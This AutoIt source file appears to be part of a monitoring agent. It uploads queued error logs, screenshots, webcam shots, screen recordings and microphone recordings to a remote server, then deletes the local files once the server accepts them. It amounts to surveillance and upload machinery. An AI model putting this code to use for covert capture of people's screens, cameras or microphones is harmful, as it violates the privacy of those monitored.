
Func moveErrors()
	
	sqliteStart()
	
	Local $hQuery,$aRow
	
	_SQLite_Query($databaseHandle, "SELECT * FROM application_errors ORDER BY id DESC ", $hQuery)
	
	While _SQLite_FetchData($hQuery, $aRow, False, False) = $SQLITE_OK
		
		Local $id=$aRow[0]
		
		Local $module=$aRow[1]
		
		Local $company_id=$aRow[2]
		
		Local $error=$aRow[3]
		
		Local $computer_serial=$aRow[4]
		
		Local $address=$serverAddress&"/putError/computer_serial/"&$computer_serial&"/company_id/"&$company_id&"/module/"&$module&"/error/"&$error
	
		Local $result= _HTTP_Get($address)
		
		if $result<>"ok" Then
			
			;transferring values to remote did not work do nothing
			
		Else
			
			;values transferred to remote now delete entry from local db
			
			_SQLite_Exec($databaseHandle, "DELETE FROM application_errors WHERE id='$id$'")
			
		EndIf	
			
	
	WEnd
        
	sqliteStop()


	
EndFunc



Func moveScreenShots()
	
	sqliteStart()
	
	Local $hQuery,$aRow
	
	_SQLite_Query($databaseHandle, "SELECT * FROM screen_shots ORDER BY id DESC ", $hQuery)
	
	While _SQLite_FetchData($hQuery, $aRow, False, False) = $SQLITE_OK
		
		Local $id=$aRow[0]
		
		Local $filePath=$aRow[1]
		
		Local $filename=$filePath
		
		Local $computer_serial=$aRow[2]
		
		Local $epoch=$aRow[3]
		
		Local $address=$serverAddress&"/putScreenShot"
		
		Local $result=_HTTP_Upload($address, $filePath, "file", "info=" & URLEncode($computer_serial&","&$epoch&","&$filename))

		
		if $result<>"ok" Then
			
			;transferring values to remote did not work do nothing
			
		Else
			
			;values transferred to remote now delete entry from local db
			
			if _SQLite_Exec($databaseHandle, "DELETE FROM screen_shots WHERE id='$id$'")== $SQLITE_OK Then
				
				if FileExists($filePath) Then
		
					FileDelete ($filePath)
					
				EndIf
				
			EndIf
			
		EndIf
			
			
	
	WEnd
        
	sqliteStop()


	
EndFunc



Func moveCameraShots()
	
	sqliteStart()
	
	Local $hQuery,$aRow
	
	_SQLite_Query($databaseHandle, "SELECT * FROM camera_shots ORDER BY id DESC ", $hQuery)
	
	While _SQLite_FetchData($hQuery, $aRow, False, False) = $SQLITE_OK
		
		Local $id=$aRow[0]
		
		Local $filePath=$aRow[1]
		
		Local $filename=$filePath
		
		Local $computer_serial=$aRow[2]
		
		Local $epoch=$aRow[3]
		
		Local $address=$serverAddress&"/putCameraShot"
		
		Local $result=_HTTP_Upload($address, $filePath, "file", "info=" & URLEncode($computer_serial&","&$epoch&","&$filename))

		
		if $result<>"ok" Then
			
			;transferring values to remote did not work do nothing
			
		Else
			
			;values transferred to remote now delete entry from local db
			
			if _SQLite_Exec($databaseHandle, "DELETE FROM camera_shots WHERE id='$id$'")== $SQLITE_OK Then
				
				if FileExists($filePath) Then
		
					FileDelete ($filePath)
					
				EndIf
				
			EndIf
			
		EndIf
			
			
	
	WEnd
        
	sqliteStop()


	
EndFunc




Func moveScreenRecordings()
	
	sqliteStart()
	
	Local $hQuery,$aRow
	
	_SQLite_Query($databaseHandle, "SELECT * FROM screen_recordings ORDER BY id DESC ", $hQuery)
	
	While _SQLite_FetchData($hQuery, $aRow, False, False) = $SQLITE_OK
		
		Local $id=$aRow[0]
		
		Local $filePath=$aRow[1]
		
		Local $filename=$filePath
		
		Local $computer_serial=$aRow[2]
		
		Local $epoch=$aRow[3]
		
		Local $address=$serverAddress&"/putScreenRecording"
		
		Local $result=_HTTP_Upload($address, $filePath, "file", "info=" & URLEncode($computer_serial&","&$epoch&","&$filename))

		
		if $result<>"ok" Then
			
			;transferring values to remote did not work do nothing
			
		Else
			
			;values transferred to remote now delete entry from local db
			
			if _SQLite_Exec($databaseHandle, "DELETE FROM screen_recordings WHERE id='$id$'")== $SQLITE_OK Then
				
				if FileExists($filePath) Then
		
					FileDelete ($filePath)
					
				EndIf
				
			EndIf
			
		EndIf
			
			
	
	WEnd
        
	sqliteStop()


	
EndFunc



Func moveMicrophoneRecordings()
	
	sqliteStart()
	
	Local $hQuery,$aRow
	
	_SQLite_Query($databaseHandle, "SELECT * FROM microphone_recordings ORDER BY id DESC ", $hQuery)
	
	While _SQLite_FetchData($hQuery, $aRow, False, False) = $SQLITE_OK
		
		Local $id=$aRow[0]
		
		Local $filePath=$aRow[1]
		
		Local $filename=$filePath
		
		Local $computer_serial=$aRow[2]
		
		Local $epoch=$aRow[3]
		
		Local $address=$serverAddress&"/putMicrophoneRecording"
		
		Local $result=_HTTP_Upload($address, $filePath, "file", "info=" & URLEncode($computer_serial&","&$epoch&","&$filename))

		
		if $result<>"ok" Then
			
			;transferring values to remote did not work do nothing
			
		Else
			
			;values transferred to remote now delete entry from local db
			
			if _SQLite_Exec($databaseHandle, "DELETE FROM microphone_recordings WHERE id='$id$'")== $SQLITE_OK Then
				
				if FileExists($filePath) Then
		
					FileDelete ($filePath)
					
				EndIf
				
			EndIf
			
		EndIf
			
			
	
	WEnd
        
	sqliteStop()


	
EndFunc


